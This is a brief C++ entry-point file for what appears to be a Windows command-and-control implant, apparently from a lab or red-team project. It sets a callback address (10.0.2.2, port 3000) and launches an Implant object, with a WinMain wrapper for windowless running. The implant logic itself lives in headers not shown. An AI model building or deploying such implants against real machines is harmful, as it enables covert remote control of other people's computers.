#include <iostream>
#include "Implant.h"
#include <Windows.h>
#include "Crypto.h"

int main()
{    

    Config config{
        .ip = "10.0.2.2",
        .port = 3000,
        .state = DISCONNECTED
    };

    Implant implant{ config };
    implant.run();
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
    main();
}